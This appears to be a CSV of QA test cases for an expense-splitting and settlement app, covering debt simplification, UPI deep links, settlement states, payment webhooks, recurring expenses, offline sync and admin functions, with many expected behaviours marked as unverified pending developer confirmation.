TC-ATTACH-004,Attachments,Negative,Medium,Object storage configured,1. Attempt to upload a .exe file disguised with a .jpg extension as a 'receipt',"Executable file, .jpg extension","UNVERIFIED — doc doesn't specify MIME-type/magic-byte validation for uploads; expect rejection based on content sniffing, not just extension; confirm validation approach with dev.",Section 2 Expense Attachments & Receipts,Security-relevant: file-type validation not documented
TC-ATTACH-005,Attachments,Negative,High,S3_ENDPOINT unreachable / MinIO service down,1. Attempt to upload a receipt while object storage backend is down,Storage backend unavailable,5xx error surfaced gracefully to client with a clear message; expense creation itself should not be silently corrupted if attachment upload is a separate step.,Section 6 Object Storage,Data integrity after failure
TC-ATTACH-006,Receipts - OCR line item cap,Boundary,Medium,Receipt image with an unusually large number of printed line items (e.g. a Costco-style 80-item receipt),1. Upload receipt image with 80 distinct line items for OCR extraction,80-line-item receipt,UNVERIFIED — Question Log Q2 flags absence of a documented max line-item cap for OCR-driven extraction and its potential for memory spikes; test to observe current behavior and confirm expected cap with dev.,Section 11 Question Log Q2,Directly from source doc's open Question Log
TC-ATTACH-007,Attachments - Guest access,Permission,High,Attachment belongs to an expense in Group G; user X is not a member of G,1. X attempts to GET the attachment's presigned download URL directly by attachmentId,Actor=non-member X,"403/404: attachment access must be scoped to group membership, not just guessable attachmentId.",Section 7 Authorization Matrix (inferred group-scoping applies to attachments),
TC-SETTLE-OPT-001,Debt Simplification,Happy Path,Critical,"Group with GroupBalanceProjectionEntity: {'A': -10000, 'B': 5000, 'C': 5000}","1. GET /v1/groups/:id/settlements/suggestions with net balances={'A': -10000, 'B': 5000, 'C': 5000}
2. Verify debtors/creditors sorted by amount descending before greedy matching
3. Inspect suggested transactions","Net balances (minor units): {'A': -10000, 'B': 5000, 'C': 5000} (Simple 1 debtor, 2 creditors, ₹100 owed by A)","GreedySettlementOptimizer sorts debtors and creditors descending by amount, then greedily matches largest-to-largest: A→B: ₹50.00; A→C: ₹50.00. Total suggested transaction count = 2.",Section 3.4 GreedySettlementOptimizer.suggest,
TC-SETTLE-OPT-002,Debt Simplification,Happy Path,Critical,"Group with GroupBalanceProjectionEntity: {'A': -30000, 'B': -20000, 'C': 25000, 'D': 25000}","1. GET /v1/groups/:id/settlements/suggestions with net balances={'A': -30000, 'B': -20000, 'C': 25000, 'D': 25000}
2. Verify debtors/creditors sorted by amount descending before greedy matching
3. Inspect suggested transactions","Net balances (minor units): {'A': -30000, 'B': -20000, 'C': 25000, 'D': 25000} (2 debtors, 2 creditors, unequal amounts)","GreedySettlementOptimizer sorts debtors and creditors descending by amount, then greedily matches largest-to-largest: A→C: ₹250.00; A→D: ₹50.00; B→D: ₹200.00. Total suggested transaction count = 3.",Section 3.4 GreedySettlementOptimizer.suggest,
TC-SETTLE-OPT-003,Debt Simplification,Happy Path,High,"Group with GroupBalanceProjectionEntity: {'A': 10000, 'B': -10000, 'C': 0}","1. GET /v1/groups/:id/settlements/suggestions with net balances={'A': 10000, 'B': -10000, 'C': 0}
2. Verify debtors/creditors sorted by amount descending before greedy matching
3. Inspect suggested transactions","Net balances (minor units): {'A': 10000, 'B': -10000, 'C': 0} (Zero-balance participant excluded from suggestions)","GreedySettlementOptimizer sorts debtors and creditors descending by amount, then greedily matches largest-to-largest: B→A: ₹100.00. Total suggested transaction count = 1.",Section 3.4 GreedySettlementOptimizer.suggest,
TC-SETTLE-OPT-004,Debt Simplification,Happy Path,High,"Group with GroupBalanceProjectionEntity: {'A': -5000, 'B': -5000, 'C': -5000, 'D': 15000}","1. GET /v1/groups/:id/settlements/suggestions with net balances={'A': -5000, 'B': -5000, 'C': -5000, 'D': 15000}
2. Verify debtors/creditors sorted by amount descending before greedy matching
3. Inspect suggested transactions","Net balances (minor units): {'A': -5000, 'B': -5000, 'C': -5000, 'D': 15000} (3 debtors owe 1 creditor equally)","GreedySettlementOptimizer sorts debtors and creditors descending by amount, then greedily matches largest-to-largest: A→D: ₹50.00; B→D: ₹50.00; C→D: ₹50.00. Total suggested transaction count = 3.",Section 3.4 GreedySettlementOptimizer.suggest,
TC-SETTLE-OPT-005,Debt Simplification,Happy Path,Critical,"Group with GroupBalanceProjectionEntity: {'A': -100000, 'B': 40000, 'C': 30000, 'D': 30000}","1. GET /v1/groups/:id/settlements/suggestions with net balances={'A': -100000, 'B': 40000, 'C': 30000, 'D': 30000}
2. Verify debtors/creditors sorted by amount descending before greedy matching
3. Inspect suggested transactions","Net balances (minor units): {'A': -100000, 'B': 40000, 'C': 30000, 'D': 30000} (1 large debtor settles with 3 creditors (multi-hop))","GreedySettlementOptimizer sorts debtors and creditors descending by amount, then greedily matches largest-to-largest: A→B: ₹400.00; A→C: ₹300.00; A→D: ₹300.00. Total suggested transaction count = 3.",Section 3.4 GreedySettlementOptimizer.suggest,
TC-SETTLE-OPT-006,Debt Simplification,Boundary,High,All group members have netBalanceMinor=0 (fully settled group),1. GET /v1/groups/:id/settlements/suggestions on a fully-settled group,All balances=0,200: returns empty suggestions array [] — rows with amountMinor===0 are explicitly skipped per algorithm (`if (balance.amountMinor === 0) continue;`).,Section 3.4 GreedySettlementOptimizer.suggest - zero-balance skip,
TC-SETTLE-OPT-007,Debt Simplification,Boundary,Medium,Group with balances split across TWO currencies: INR and USD simultaneously,1. GET /v1/groups/:id/settlements/suggestions where some members have INR balances and others USD balances,Mixed-currency balances (byCurrency Map),Suggestions are computed independently per currency (algorithm groups by currencyCode into separate Maps); an INR debtor is never matched against a USD creditor — only same-currency pairs appear in output.,Section 3.4 GreedySettlementOptimizer - byCurrency Map grouping,
TC-SETTLE-OPT-008,Debt Simplification,Boundary,Medium,Group with exactly 1 debtor and 1 creditor whose amounts are exactly equal,"1. Balances={A:-50000,B:50000}
2. GET suggestions",Perfectly matched pair,Single suggestion: A→B ₹500.00; both debtorIndex and creditorIndex increment together in the same loop iteration since amountMinor becomes 0 for both simultaneously.,Section 3.4 GreedySettlementOptimizer - simultaneous index increment edge case,
TC-SETTLE-OPT-009,Debt Simplification,Permission,High,Non-member X attempts to view settlement suggestions for group G,1. GET /v1/groups/:id/settlements/suggestions as non-member X,Actor=non-member X,403/404 Forbidden — no financial suggestion data returned to non-members.,Section 7 Authorization Matrix (group-scoped access),
TC-SETTLE-OPT-010,Debt Simplification,Integration,Medium,Group with simplifyDebtsEnabled=false and non-zero balances,1. GET /v1/groups/:id/settlements/suggestions with the flag disabled,simplifyDebtsEnabled=false,"UNVERIFIED — as noted in Section 4.2, the exact behavioral difference when this flag is false is not documented (raw pairwise debts vs. optimizer still running); confirm with dev.",Section 4.2 GroupEntity.simplifyDebtsEnabled,"Known gap, cross-referenced from GROUP section"
TC-UPI-001,UPI Deep Link,Happy Path,Critical,"SettlementIntentEntity created, paymentMethod=upi, payee has valid VPA registered","1. POST /v1/settlements/intents with paymentMethod=upi, amountMinor=25050, payeeVpa='payee@upi'
2. Inspect generated deep link","amountMinor=25050 (₹250.50), payeeVpa=payee@upi","UpiUriBuilder generates a valid upi://pay URI containing pa=payee@upi, am=250.50 (decimal, NOT minor units), cu=INR, tr=<transaction reference>, tn=<note>; URI is properly URL-encoded.",Section 3.4-adjacent Section 2 UPI Intent & Deep Link; UpiUriBuilder,
TC-UPI-002,UPI Deep Link,Boundary,High,SettlementIntentEntity amountMinor=1 (1 paisa),1. Generate UPI URI for amountMinor=1,amountMinor=1,UpiUriBuilder must correctly convert 1 minor unit to decimal am=0.01 (not 0.1 or 1.00) — precision-critical minor-to-major conversion.,Section 3.4 UpiUriBuilder decimal amount conversion,Precision risk: minor-unit-to-decimal conversion boundary
TC-UPI-003,UPI Deep Link,Negative,Medium,Payee has no VPA on file,1. Attempt to generate UPI deep link for a settlement intent where payee has no registered VPA,payeeVpa=null,UNVERIFIED — doc doesn't specify fallback behavior when no VPA exists (block UPI method entirely vs. prompt user to enter VPA manually); expected 400 'no VPA configured'; confirm with dev.,Section 2 UPI Intent & Deep Link,
TC-UPI-004,UPI Deep Link,Negative,Medium,Note/description field contains special URI characters,1. Generate UPI URI with tn (transaction note) = 'Rent & Bills #2026 100% due',"Note with &, #, % characters",Special characters in the transaction note must be properly percent-encoded in the resulting URI so the deep link remains well-formed and does not truncate at the '&' or '#'.,Section 3.4 UpiUriBuilder - URI encoding,
TC-UPI-005,UPI Deep Link,Boundary,Medium,"amountMinor is a large value, e.g. ₹5,00,000 settlement",1. Generate UPI URI for amountMinor=50000000,"amountMinor=50000000 (₹5,00,000.00)","am=500000.00 correctly formatted; verify most UPI apps/banks impose real-world per-transaction caps (typically ₹1,00,000) — flag as an app-level UX consideration even though not enforced by UpiUriBuilder itself.",Section 3.4 UpiUriBuilder,Real-world UPI cap not addressed in doc; note for dev
TC-UPI-006,UPI Deep Link,Integration,Medium,SettlementIntentEntity created with paymentMethod=cash,1. POST /v1/settlements/intents with paymentMethod=cash,paymentMethod=cash,No UPI deep link is generated for cash payment method; response omits the upi:// URI field entirely (or returns null).,Section 4.5 SettlementIntentEntity.paymentMethod enum - upi|cash|gateway,
TC-SETTLE-SM-001,Settlement State Machine,Happy Path,Critical,Settlement suggestion exists: A owes B ₹300,"1. A calls POST /v1/settlements/intents (state→'suggested' or initial state)
2. A pays via UPI, calls POST /v1/settlements/intents/:id/proof with referenceNumber
3. B calls POST /v1/settlements/intents/:id/confirm","amountMinor=30000, full happy-path lifecycle","State transitions: suggested → proof_submitted (after step 2, PaymentProofEntity created) → confirmed (after step 3, SETTLEMENT_POSTED event appended, balanced ledger postings created reducing A's debt to B by ₹300.00).",Section 3.4-5 Settlement State Machine 16-state lifecycle; Section 5 Settlement Endpoints,
TC-SETTLE-SM-002,Settlement State Machine,Permission,Critical,"Settlement intent state=proof_submitted, payer=A, payee=B","1. A (the payer, not payee) attempts to call POST .../confirm on their own settlement","Actor=payer A, endpoint=confirm",403 Forbidden: confirm action requires Payee or Admin per endpoint auth ('Payee / Admin'); the payer cannot self-confirm their own payment.,Section 5 POST /v1/settlements/intents/:id/confirm - Payee / Admin only,
TC-SETTLE-SM-003,Settlement State Machine,Permission,High,Settlement intent state=proof_submitted; group admin (not payee) attempts confirm,1. Group Admin calls POST .../confirm even though they are neither payer nor payee,"Actor=Admin, not payee","200: allowed — endpoint auth explicitly permits 'Payee / Admin', so an Admin can confirm on behalf of the payee.",Section 5 POST /v1/settlements/intents/:id/confirm - Payee / Admin,
TC-SETTLE-SM-004,Settlement State Machine,State-Sequence,Critical,Settlement intent state='suggested' (no proof submitted yet),"1. Payee B attempts POST .../confirm directly, skipping the proof-submission step","State=suggested, confirm attempted","409 Conflict / 400: state machine must reject an out-of-order transition — confirm should only be valid from 'proof_submitted' (or equivalent pre-confirm state), not directly from 'suggested'. UNVERIFIED exact allowed source states — the doc lists only proof-submission and confirmation as points in the flow, not the full 16-state list; confirm exact transition table with dev.",Section 3.4-5 Settlement State Machine,Known gap: only 2 of the 16 documented states are named in the source doc; full transition table not provided
TC-SETTLE-SM-005,Settlement State Machine,Permission,Critical,Settlement intent state=proof_submitted,1. Payer A calls POST .../proof for a second time (resubmitting proof) — verify who is authorized,"Actor=Payer A, re-submitting proof",200: 'Payer Access' per doc allows the payer to submit/resubmit proof while in an appropriate pre-confirm state; verify resubmission updates PaymentProofEntity rather than creating unlimited duplicate proof rows (UNVERIFIED whether duplicates are prevented — confirm with dev).,Section 5 POST /v1/settlements/intents/:id/proof - Payer Access,
TC-SETTLE-SM-006,Settlement State Machine,Permission,High,Settlement intent exists between A(payer) and B(payee),1. Unrelated group member C (neither payer nor payee) attempts POST .../proof,"Actor=C, unrelated member",403 Forbidden: only the Payer is authorized to submit proof per documented endpoint auth.,Section 5 POST /v1/settlements/intents/:id/proof - Payer Access only,
TC-SETTLE-SM-007,Settlement State Machine,Happy Path,High,Settlement intent state=proof_submitted,1. Payee B disputes the payment instead of confirming: POST .../dispute,Dispute action,200: state transitions to 'disputed'; no ledger postings are made (SETTLEMENT_POSTED does not fire); expense/settlement remains open for resolution.,Section 5 POST /v1/settlements/intents/:id/dispute,
TC-SETTLE-SM-008,Settlement State Machine,State-Sequence,High,Settlement intent state=confirmed (already fully settled and posted to ledger),1. Payee attempts POST .../dispute AFTER already confirming the same settlement,"State=confirmed, dispute attempted post-hoc",UNVERIFIED — this is exactly the ambiguity flagged in Section 11 Q1 of the source doc ('Should partial settlements allow dispute after receiver confirmation?'); write and hold this test pending product policy confirmation.,Section 11 Question Log Q1,Directly from source doc's open Question Log — highest priority to resolve
TC-SETTLE-SM-009,Settlement State Machine,State-Sequence,Critical,"Settlement intent state=confirmed, ledger postings already applied",1. Attempt POST .../confirm a second time on an already-confirmed settlement,Double-confirm attempt,409 Conflict: must not post duplicate SETTLEMENT_POSTED ledger entries — idempotent rejection of a repeat confirm.,Section 3.5 Balanced Posting Set - must not double-post,
TC-SETTLE-SM-010,Settlement State Machine,Concurrency,Critical,Settlement intent state=proof_submitted,1. Fire two simultaneous POST .../confirm requests from Payee B's two open browser tabs,"Two parallel confirm requests, same settlement","UNVERIFIED — doc doesn't document optimistic locking / row-level locking on SettlementIntentEntity.state; expected: exactly ONE request succeeds (200, state→confirmed, ledger posted once) and the other fails (409 'already confirmed' or is rejected by a transaction-level unique constraint); confirm concurrency-control mechanism with dev.",Section 8 Database Transactions - QueryRunner/EntityManager.transaction,Concurrency-critical: double-settlement race condition
TC-SETTLE-SM-011,Settlement State Machine,Negative,Medium,Settlement intent does not exist,1. POST /v1/settlements/intents/00000000-0000-0000-0000-000000000000/confirm,Non-existent settlementIntentId,404 Not Found.,Section 5 Settlement Endpoints,
TC-SETTLE-SM-012,Settlement State Machine,Boundary,Medium,Settlement intent for amountMinor=1 (smallest possible settlement),1. Full lifecycle: create → proof → confirm for a 1-paisa settlement,amountMinor=1,"Full lifecycle completes normally; ledger posting for exactly 1 minor unit balances to zero (payer -1, payee +1).",Section 3.5 Balanced Posting Set,
TC-SETTLE-SM-013,Settlement State Machine - Screenshot Proof,Happy Path,Medium,Settlement intent state=suggested,1. Payer submits proof with proofType=screenshot_attachment and an attachmentId referencing an uploaded image,proofType=screenshot_attachment,"200: PaymentProofEntity created with proofType=screenshot_attachment, attachmentId set, referenceNumber may be null; state→proof_submitted.",Section 4.5 PaymentProofEntity.proofType enum,
TC-SETTLE-SM-014,Settlement State Machine - UPI Ref Proof,Happy Path,Medium,"Settlement intent state=suggested, paymentMethod=upi",1. Payer submits proof with proofType=upi_ref and referenceNumber='UPI2026081312345',"proofType=upi_ref, referenceNumber set",200: PaymentProofEntity created with proofType=upi_ref; system may attempt auto-match against UpiPaymentReferenceEntity for automated confirmation per documented 16-state lifecycle ('auto-matching').,Section 2 Settlement State Machine - auto-matching,
TC-SETTLE-SM-015,Settlement State Machine - Auto-match,Integration,Medium,UpiPaymentReferenceEntity exists matching a referenceNumber submitted as proof,1. Submit proof with a referenceNumber that matches an existing UpiPaymentReferenceEntity for the exact amount and payee VPA,Matching UPI reference,UNVERIFIED — doc names 'auto-matching' as part of the 16-state lifecycle but does not describe the exact matching criteria or whether it auto-transitions to 'confirmed' without payee action; confirm with dev.,Section 4.5 UpiPaymentReferenceEntity; Section 2 auto-matching,Known gap: auto-matching logic undocumented
TC-PAYGW-001,Payment Gateway - Razorpay,Happy Path,Critical,"PAYMENT_GATEWAY_DRIVER=razorpay; SettlementIntentEntity state=suggested, paymentMethod=gateway",1. Razorpay sends a valid signed webhook POST to the payment-webhook endpoint with event=payment.captured for the settlement's order,"Valid Razorpay webhook, signature verified",200: webhook signature verified against Razorpay secret; SettlementIntentEntity transitions toward confirmed; PaymentProofEntity/ledger posting occurs automatically without manual payee confirmation.,Section 2 Payment Gateways; Section 6 Integrations,
TC-PAYGW-002,Payment Gateway - Razorpay,Negative,Critical,PAYMENT_GATEWAY_DRIVER=razorpay,1. Send a webhook POST with an INVALID/forged signature,Forged webhook signature,401/400: signature verification fails; webhook rejected; no settlement state change or ledger posting occurs.,Section 2 Payment Gateways,Security-critical: webhook forgery must not trigger fake settlements
TC-PAYGW-003,Payment Gateway - Cashfree,Happy Path,Critical,PAYMENT_GATEWAY_DRIVER=cashfree; CASHFREE_APP_ID/CASHFREE_SECRET_KEY configured,1. Cashfree sends a valid signed webhook for a successful payout/payment event,Valid Cashfree webhook,200: signature verified using CASHFREE_SECRET_KEY; settlement state updated accordingly.,"Section 1 env vars CASHFREE_APP_ID, CASHFREE_SECRET_KEY",
TC-PAYGW-004,Payment Gateway,Negative,High,"PAYMENT_GATEWAY_DRIVER=manual (default), no gateway configured",1. Send a Razorpay-formatted webhook while the driver is set to 'manual',Webhook sent to manual-mode deployment,"UNVERIFIED — doc doesn't state whether the webhook endpoint 404s, 400s, or silently ignores events when PAYMENT_GATEWAY_DRIVER=manual; confirm with dev.",Section 1 env var PAYMENT_GATEWAY_DRIVER default=manual,
TC-PAYGW-005,Payment Gateway,Concurrency,High,Gateway sends the SAME webhook event twice (common webhook-delivery guarantee is at-least-once),1. Send the identical valid webhook payload twice in quick succession,Duplicate webhook delivery,Second delivery must be a no-op (idempotent) — settlement must not be double-confirmed or ledger-posted twice; expected reliance on an event/idempotency key from the gateway payload.,Section 8 Idempotency Control (inferred to also apply to webhooks),
TC-PAYGW-006,Payment Gateway,Negative,Medium,Webhook references a settlementIntentId that does not exist in this system,1. Send a validly-signed webhook whose order/reference metadata doesn't match any known SettlementIntentEntity,Unknown reference in webhook,"200 (acknowledged to gateway, to prevent retries) but no state change is applied internally; error logged for investigation.",Section 2 Payment Gateways,
TC-RECUR-001,Recurring Expenses,Happy Path,High,Group exists; user schedules a recurring rent expense,"1. POST recurring expense config: frequency=monthly, amountMinor=2000000, startDate=2026-09-01, splitType=equal among A,B
2. Trigger the background job (JobsController) authenticated via x-cron-secret","frequency=monthly, amountMinor=2000000 (₹20,000.00)","200: on/after 2026-09-01, background job generates a new ExpenseProjectionEntity occurrence with the configured split, posts ledger entries, and schedules the next occurrence for 2026-10-01.",Section 2 Recurring Expenses; Section 6 Background Jobs / Cron,
TC-RECUR-002,Recurring Expenses,Negative,Critical,JobsController endpoint requires x-cron-secret header matching CRON_SECRET,1. POST to the recurring-expense-generation job endpoint with a missing or incorrect x-cron-secret header,Missing/incorrect x-cron-secret,401/403 Forbidden: job endpoints must reject requests without the correct shared secret — prevents public triggering of financial-mutation jobs.,Section 1 env var CRON_SECRET; Section 6 NestJS JobsController auth,Security-critical: cron endpoints are financial-mutation-capable and must not be publicly triggerable
TC-RECUR-003,Recurring Expenses,Boundary,Medium,Recurring expense configured with frequency=daily,1. Trigger the job daily for 7 consecutive simulated days,"frequency=daily, 7 occurrences","Exactly 7 new ExpenseProjectionEntity occurrences created, one per day, none skipped or duplicated.",Section 2 Recurring Expenses,
TC-RECUR-004,Recurring Expenses,Boundary,Medium,"Recurring expense configured with frequency=yearly, startDate=2024-02-29 (leap day)",1. Trigger job generation for the next occurrence in 2025 (non-leap year),Leap-day anchored yearly recurrence,UNVERIFIED — doc doesn't specify leap-day handling for yearly recurrence (Feb 29 → Feb 28 or Mar 1 in non-leap years); confirm with dev.,Section 2 Recurring Expenses - yearly frequency,Known date-edge-case gap
TC-RECUR-005,Recurring Expenses - Idempotent job run,Concurrency,High,Recurring job already ran and generated today's occurrence,1. Trigger the SAME cron job endpoint a second time on the same day (e.g. due to a retry),"Duplicate cron trigger, same day","UNVERIFIED — doc doesn't specify whether the job is idempotent per (recurringConfigId, date); expected: no duplicate occurrence created on re-run; confirm with dev.",Section 6 Background Jobs / Cron,Concurrency/idempotency gap for scheduled jobs
TC-RECUR-006,Recurring Expenses,Permission,High,Member (not owner/admin) attempts to configure a recurring expense for the group,1. Member calls POST to create a recurring expense config,Actor=Member,200 if treated like normal expense_create (Member ✅) OR 403 if recurring config requires elevated permission — UNVERIFIED which permission applies since recurring expenses aren't listed in the Authorization Matrix table; confirm with dev.,Section 7 Authorization Matrix (recurring expenses not explicitly listed),Known gap: recurring-expense permission not in documented matrix
TC-RECUR-007,Recurring Expenses,State-Sequence,Medium,Active recurring expense config exists,1. User deletes/cancels the recurring config after 3 occurrences have already been generated,Cancel after 3 occurrences,Future occurrences stop generating; the 3 already-created ExpenseProjectionEntity rows and their ledger postings remain unaffected (not retroactively voided).,Section 2 Recurring Expenses,
TC-RECUR-008,Recurring Expenses,Boundary,Low,"Recurring config with frequency=weekly, endDate set 2 weeks from start","1. Trigger job generation for week 1, week 2, and attempt week 3 (past endDate)",endDate boundary at week 2,Occurrences generated for week 1 and week 2 only; the job must NOT generate an occurrence past the configured endDate.,Section 2 Recurring Expenses,
TC-IMPEXP-001,Import - Splitwise CSV,Happy Path,High,Owner has a valid Splitwise export CSV with 20 historical expenses,1. POST the CSV file to the imports-exports import endpoint,"Valid Splitwise CSV, 20 rows",200: 20 new ExpenseProjectionEntity rows created with balanced ledger postings matching the CSV amounts and participants (mapped to existing/ghost ParticipantEntity rows).,Section 2 Import / Export - Splitwise CSV,
TC-IMPEXP-002,Import - Splitwise CSV,Negative,High,Owner uploads a malformed/corrupted CSV (wrong column headers),1. POST a CSV missing required Splitwise columns (e.g. no 'Cost' column),Malformed CSV,400 Bad Request: import rejected with a clear parsing error; no partial/corrupt expenses created (all-or-nothing import).,Section 2 Import / Export,Data integrity: partial-import rollback behavior
TC-IMPEXP-003,Import - Splitwise CSV,Boundary,Medium,CSV contains a row with an amount that doesn't parse as a valid number,1. Import a CSV where one row's Cost field = 'N/A',One invalid row among otherwise-valid rows,UNVERIFIED — doc doesn't specify row-level vs. whole-file failure handling; expected (best-guess) whole import fails with the offending row identified; confirm partial-import policy with dev.,Section 2 Import / Export,
TC-IMPEXP-004,Import - Bank Statement (Setu AA),Happy Path,High,User has consented to Setu Account Aggregator data sharing,1. Trigger bank statement import via Setu AA integration,Setu AA consent + statement data,200: bank transactions imported and available for reconciliation against existing expenses/settlements (exact matching UI/logic not detailed further in doc).,Section 2 Import / Export - Setu Account Aggregator bank statements,
TC-IMPEXP-005,Export - PDF Ledger,Happy Path,High,Group with 30 expenses and several settlements over 3 months,1. Owner calls GET export endpoint with format=pdf for the group's ledger,format=pdf,"200: PDF generated containing all expenses, splits, and settlement history for the group, matching the underlying ledger data exactly (no discrepancies vs. in-app totals).",Section 2 Import / Export - Export PDF/CSV ledgers,
TC-IMPEXP-006,Export - CSV Ledger,Happy Path,Medium,Group with expenses,1. Owner calls GET export endpoint with format=csv,format=csv,"200: CSV download with one row per ledger posting/expense, amounts in major units (decimal) for human readability, matching minor-unit source data exactly.",Section 2 Import / Export,
TC-IMPEXP-007,Export,Permission,Critical,Member (not owner/admin) attempts to export the group ledger,1. Member calls GET export endpoint,Actor=Member,403 Forbidden: export permission is Owner/Admin only per Authorization Matrix.,Section 7 Authorization Matrix - export ❌Member ❌Viewer,
TC-IMPEXP-008,Export,Boundary,Low,Group with 0 expenses,1. Owner exports an empty group's ledger,Empty group,"200: valid but empty PDF/CSV generated (headers only, no data rows) rather than an error.",Section 2 Import / Export,
TC-NOTIF-001,Notifications - Push,Happy Path,High,NOTIFICATION_PROVIDER_DRIVER=expo; user B has a registered DeviceInstallationEntity,1. User A creates an expense that includes B as a participant,New expense involving B,"Push notification sent to B via Expo Push API shortly after expense creation, referencing the expense description/amount; notification NOT sent to A (the actor) about their own action.",Section 2 Push Notifications & Emails; Section 6 Integration #4,
TC-NOTIF-002,Notifications - Push,Happy Path,Medium,NOTIFICATION_PROVIDER_DRIVER=fcm; FCM_SERVICE_ACCOUNT_JSON configured; B on Android,1. A creates a settlement request targeting B,Settlement request to B,Push notification sent via Firebase Admin SDK referencing the settlement amount and payer.,Section 6 Integration #4 - fcm driver,
TC-NOTIF-003,Notifications - Push,Negative,Medium,B has no registered DeviceInstallationEntity (never opened the app / denied permissions),1. A creates an expense involving B,B has zero device tokens,No push send attempt errors out the expense-creation flow; expense creation still succeeds (notification failure must not block the primary financial action).,Section 4.1 DeviceInstallationEntity,Resilience: notification side-effect failure should not block core action
TC-NOTIF-004,Notifications - Email,Happy Path,Medium,EMAIL_PROVIDER_DRIVER=brevo; BREVO_API_KEY/BREVO_SENDER_EMAIL configured,1. Monthly summary report job runs for a user with 15 expenses that month,Monthly summary trigger,Transactional email sent via Brevo API v3 with a summary of the month's expenses/balances; sender = BREVO_SENDER_EMAIL.,Section 6 Integration #3 - Transactional Emails,
TC-NOTIF-005,Notifications - Email,Happy Path,Medium,EMAIL_PROVIDER_DRIVER=resend,1. Trigger OTP request-otp email flow with resend driver active,Onboarding OTP email,Email sent via Resend Node SDK containing the OTP code; correct driver selected based on EMAIL_PROVIDER_DRIVER env value.,Section 6 Integration #3 - resend driver,
TC-NOTIF-006,Notifications - Reminders,Happy Path,Medium,"B owes A ₹500, unsettled for 14+ days",1. Reminder job runs for stale unsettled balances,Stale balance reminder,Push/email reminder sent to B about the outstanding ₹500.00 balance owed to A.,Section 6 Push Notifications - reminders,
TC-NOTIF-007,Notifications - Suppression,Negative,Medium,"Expense is voided immediately (within seconds) after creation, before the notification job runs",1. A creates then immediately voids an expense before any notification is dispatched,Create then immediate void,UNVERIFIED — doc doesn't specify whether a queued-but-not-yet-sent notification for the voided expense is cancelled or still delivered (referencing now-voided data); confirm with dev.,Section 2 Push Notifications & Emails,Race condition between event and async notification dispatch
TC-NOTIF-008,Notifications,Negative,Low,"All notification env vars unset, NOTIFICATION_PROVIDER_DRIVER=dev (default)",1. Create an expense in a dev-driver deployment,dev driver active,"No real push/email sent; dev driver likely logs the notification payload instead (no external API call), and expense creation is unaffected.",Section 1 env var NOTIFICATION_PROVIDER_DRIVER default=dev,
TC-SYNC-001,Offline Sync,Happy Path,High,Mobile client goes offline; user adds 2 expenses and 1 settlement confirmation while offline (queued in expo-sqlite OfflineCommandQueue),"1. Reconnect to network
2. Client calls POST /v1/offline-sync/push with the 3 queued commands in order",3 queued offline commands,"200: all 3 commands are applied server-side IN ORDER, producing the same end-state as if they'd been executed online sequentially; server returns per-command results/conflicts if any.",Section 9 Offline Support & SQLite Queue; Section 5 POST /v1/offline-sync/push,
TC-SYNC-002,Offline Sync,State-Sequence,Critical,Two of the queued offline commands operate on the SAME expense (create then edit) while ANOTHER online client also edited that expense in the meantime,1. Push the offline create+edit command pair after a conflicting online edit already landed,Offline edit vs. online edit conflict,UNVERIFIED — doc doesn't specify the conflict-resolution strategy (last-write-wins vs. version-based optimistic-lock rejection) for offline-queued mutations that race an online mutation; confirm with dev.,Section 9 State Management & Sync (Frontend),Known gap: offline/online conflict resolution undocumented
TC-SYNC-003,Offline Sync - Delta Pull,Happy Path,High,Client's local sinceVersion=42; server has SyncProjectionChangeEntity rows for versions 43-50,1. GET /v1/offline-sync/pull?sinceVersion=42,sinceVersion=42,"200: returns exactly the incremental changes for versions 43 through 50 (8 changes), not the full dataset, allowing the client to catch up efficiently.",Section 9 Delta Sync Protocol; Section 5 GET /v1/offline-sync/pull,
TC-SYNC-004,Offline Sync - Delta Pull,Boundary,Medium,Client's local sinceVersion is already fully up to date (no new server changes),1. GET /v1/offline-sync/pull?sinceVersion=<latest>,sinceVersion=latest known,"200: returns an empty changes array, not an error.",Section 9 Delta Sync Protocol,
TC-SYNC-005,Offline Sync - Delta Pull,Negative,Medium,Client sends a sinceVersion that is HIGHER than the server's current max version (corrupted local state),1. GET /v1/offline-sync/pull?sinceVersion=999999999,Invalid/future sinceVersion,UNVERIFIED — doc doesn't specify handling of an out-of-range sinceVersion; expected (best-guess) 400 or a signal for the client to perform a full resync; confirm with dev.,Section 9 Delta Sync Protocol,
TC-SYNC-006,Offline Sync - Push idempotency,Negative,High,Network drops after the push request reaches the server but before the client receives the response,1. Client retries the SAME POST /v1/offline-sync/push payload (including any client-generated command IDs) after the timeout,Duplicate push due to timeout retry,Server-side idempotency (via command IDs generated client-side in the OfflineCommandQueue) ensures the retry does not apply the same commands twice.,Section 9 Offline Support & SQLite Queue; Section 8 Idempotency Control,Data integrity after failure: network drop mid-request
TC-SYNC-007,Offline Sync - Optimistic UI Rollback,Integration,Medium,Mobile client optimistically shows a new expense in the UI immediately upon offline queueing,"1. Queue an expense offline that will FAIL server-side validation once synced (e.g. exact-split sum mismatch)
2. Reconnect and push",Offline command that fails validation on sync,UNVERIFIED — doc doesn't describe the client-side rollback UX for a command that was optimistically applied locally but rejected by the server on sync; confirm expected behavior with dev.,Section 9 State Management & Sync (Frontend),Known gap: optimistic-update rollback behavior undocumented
TC-ADMIN-001,Admin - Auth,Happy Path,Critical,AdminUserEntity exists with valid credentials,1. POST admin login endpoint with valid admin credentials,Valid admin credentials,"200: JWT signed with JWT_ADMIN_ACCESS_SECRET/JWT_ADMIN_REFRESH_SECRET returned, distinct token namespace from regular user auth.",Section 7 Admin JWT - dedicated secrets,
TC-ADMIN-002,Admin - User Management,Happy Path,Critical,Admin authenticated; target UserEntity.status=active,1. Admin calls suspend-user endpoint for a target user,targetUserId,200: UserEntity.status set to 'suspended'; user's existing access tokens should stop granting access on next validated request (UNVERIFIED whether suspension is checked per-request or only at next login — confirm with dev).,Section 2 Admin Control Plane; Section 4.1 UserEntity.status,
TC-ADMIN-003,Admin - Audit Log,Happy Path,High,"Several financial actions (expense creation, settlement confirm, role change) have occurred",1. Admin GET the audit log inspection endpoint filtered by date range,Date range filter,"200: returns an immutable, chronological list of audit entries corresponding to the EventStoreEntity events in that window (or a derived audit projection), with actor, action type, and timestamp per entry.",Section 2 Admin Control Plane - audit log inspection,
TC-ADMIN-004,Admin - Feature Flags,Happy Path,High,Admin authenticated,1. Admin toggles a feature flag (e.g. enable itemized-split for a specific group) to 'off',Feature flag toggle,"200: flag updated; the corresponding feature becomes unavailable to end users on subsequent requests (exact enforcement point UNVERIFIED — confirm which layer checks the flag, with dev).",Section 2 Admin Control Plane - feature flag toggles,
